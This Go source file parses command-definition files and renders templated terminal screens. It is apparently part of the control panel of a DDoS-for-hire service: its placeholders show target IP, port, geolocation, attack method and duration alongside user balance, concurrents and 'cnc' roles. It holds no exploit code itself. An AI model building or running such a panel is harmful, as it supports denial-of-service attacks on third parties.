package commands

import (
	"api/core/database"
	"api/core/models"
	"api/core/models/servers"
	"api/core/net/sessions"
	sess "api/core/master/sessions"
	"api/core/net/utils"
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

var SpinnerChars = []string{"|", "/", "-", "\\"}

//declair cmd
func parseTFXFile(filepath string) (*CommandDetails, []string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to open file %s: %v", filepath, err)
	}
	defer file.Close()

	var details CommandDetails
	var lines []string
	scanner := bufio.NewScanner(file)
	isDetailsSection := true
	for scanner.Scan() {
		line := scanner.Text()
		if line == "==================" {
			isDetailsSection = false
			continue
		}
		if isDetailsSection {
			parts := strings.SplitN(line, "=", 2)
			if len(parts) != 2 {
				continue
			}
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			switch key {
				//getname
			case "name":
				details.Name = value
				//getdiscrip
			case "description":
				details.Description = value
				//getadmin true?
			case "admin":
				admin, err := strconv.ParseBool(value)
				if err != nil {
					return nil, nil, fmt.Errorf("failed to parse admin value in file %s: %v", filepath, err)
				}
				details.Admin = admin
			case "system":
				system, err := strconv.ParseBool(value)
				if err != nil {
					return nil, nil, fmt.Errorf("failed to parse admin value in file %s: %v", filepath, err)
				}
				details.System = system
			}
		} else {
			lines = append(lines, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, nil, fmt.Errorf("error reading file %s: %v", filepath, err)
	}

	return &details, lines, nil
}

func renderLine(session *sessions.Session, line string, adminrole bool, apirole bool, cncrole bool, viprole bool, details *CommandDetails, currentTime string, ipinfo utils.GeoIPDetails) {
	i := 0 // Initialize the counter for spinner animation
	adminStr := strconv.FormatBool(adminrole)
    apiStr := strconv.FormatBool(apirole)
    cncStr := strconv.FormatBool(cncrole)
    vipStr := strconv.FormatBool(viprole)

	replacer := strings.NewReplacer(
		//network/server stats
		"<<username>>", 		session.User.Username,
		"<<globalRunning>>", 	strconv.Itoa(database.Container.GlobalRunning()),
		"<<sitename>>", 		models.Config.Name,
		"<<slots>>", 			strconv.Itoa(servers.Slots()[0]),
		"<<vers>>",				models.Config.Vers,
		"<<running>>", 			strconv.Itoa(database.Container.GlobalRunning()),
		"<<online>>",			strconv.Itoa(sessions.Count() + sess.Count()),
		//fun stuff
		"<<spinner>>", 			utils.SpinnerChars[i%len(SpinnerChars)],
		"<<clear>>", 			"\033c",
		//cmd info
		"<<name>>", 			details.Name,
		"<<description>>", 		details.Description,
		"<<admin>>", 			strconv.FormatBool(details.Admin),
		//attack info
		"<<ip>>", 				GlobalIP,
		"<<ip-city>>", 			ipinfo.City,
		"<<ip-country>>", 		ipinfo.Country,
		"<<ip-hostname>>", 		ipinfo.Hostname,
		"<<port>>", 			GlobalPort,
		"<<time>>", 			GlobalTime,
		"<<method>>", 			GlobalMethod,
		"<<time.now>>", 		currentTime,
		//user info
		"<<username>>", 		session.User.Username,
		"<<maxtime>>", 			strconv.Itoa(session.User.Duration),
		"<<conns>>", 			strconv.Itoa(session.User.Concurrents),
		"<<balance>>", 			strconv.Itoa(session.User.Balance),
		"<<role.admin>>",		adminStr,
		"<<role.cnc>>",			cncStr,
		"<<role.api>>",			apiStr,
		"<<role.vip>>",			vipStr,
	)
	line = replacer.Replace(line)
	fmt.Fprintf(session.Conn, "%s\r\n", line)
}


func processLines(session *sessions.Session, lines []string, details *CommandDetails) {
    currentTime := time.Now().Format("2006-01-02") // Format the current time as needed
    ipDetails, err := utils.GetIPDetails(GlobalIP)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    // Define variables to store role permissions
    var adminrole, apirole, cncrole, viprole bool
    if session.User.HasPermission("admin") {
        adminrole = true
    }
    if session.User.HasPermission("api") {
        apirole = true
    }
    if session.User.HasPermission("cnc") {
        cncrole = true
    }
    if session.User.HasPermission("vip") {
        viprole = true
    }

    // Convert ipDetails to GeoIPDetails
    var ipinfo utils.GeoIPDetails = *ipDetails

    // Process each line
    for _, line := range lines {
        renderLine(session, line, adminrole, apirole, cncrole, viprole, details, currentTime, ipinfo)
    }
}
